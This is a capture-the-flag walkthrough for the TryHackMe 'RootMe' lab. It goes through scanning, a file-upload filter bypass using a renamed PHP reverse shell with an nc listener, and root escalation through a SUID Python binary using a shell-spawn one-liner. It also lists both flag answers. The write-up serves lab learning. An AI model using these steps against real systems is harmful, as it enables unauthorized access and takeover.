# CTF: RootMe (THM)

## Metadata

- **Target IP:** 10.49.185.77
    
- **OS:** Ubuntu (Linux)
    
- **Difficulty:** Easy
    
- **Date:** 2026-03-08
    
- **Key Skills/Tools:** `nmap`, `gobuster`, File Upload Bypass (Extension Filtering), SUID Exploitation, Python GTFOBins.
    

---

## Reconnaissance

### Port Scanning

A standard aggressive scan was performed to identify open services.

Bash

```
sudo nmap -A -T4 $target
```

**Key Ports:**

- **22/tcp:** OpenSSH 8.2p1 (Ubuntu)
    
- **80/tcp:** Apache httpd 2.4.41
    

### Directory Brute-forcing

Using `gobuster` with a large wordlist revealed two critical directories not linked on the homepage.

Bash

```
gobuster dir -u http://$target -w /usr/share/wordlists/dirb/big.txt
```

**Interesting Discoveries:**

- `/panel/`: A hidden upload page.
    
- `/uploads/`: The directory where uploaded files are stored.
    

---

## Credential Cracking

_No credentials were required for the initial foothold as the entry point was an unauthenticated file upload._

---

## Foothold

### File Upload Bypass

The `/panel/` directory provided a file upload form. Direct uploads of `.php` files were blocked by a basic extension filter.

**Execution:**

1. Prepared a PHP reverse shell (PentestMonkey).
    
2. Renamed the file from `shell.php` to `shell.php5` to bypass the blacklist.
    
3. Uploaded the file via `/panel/`.
    
4. Navigated to `http://10.49.185.77/uploads/shell.php5` while listening on `nc -lvnp 1234`.
    

**Result:** Caught a reverse shell as the `www-data` user.

---

## Lateral Movement

_Direct escalation from `www-data` to `root` was possible; no intermediate user hopping was required._

---

## Privilege Escalation

### SUID Binary Enumeration

Searching for files with the SUID bit set revealed an unusual entry: **Python 2.7**.

Bash

```
find / -perm -04000 -type f -ls 2>/dev/null
```

**Result:** `/usr/bin/python2.7` has the SUID bit set, meaning it runs with the permissions of the file owner (root).

### Exploitation (GTFOBins)

Since Python can execute system commands, and it's running as root, I used it to spawn a shell that maintains the effective UID of root.

Bash

```
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

- The `-p` flag is crucial here to ensure the shell doesn't drop the privileged effective ID.
    

---

## Flags

| **Flag Type** | **Value**                 |
| ------------- | ------------------------- |
| **User**      | THM{y0u_g0t_a_sh3ll}      |
| **Root**      | THM{pr1v1l3g3_3sc4l4t10n} |
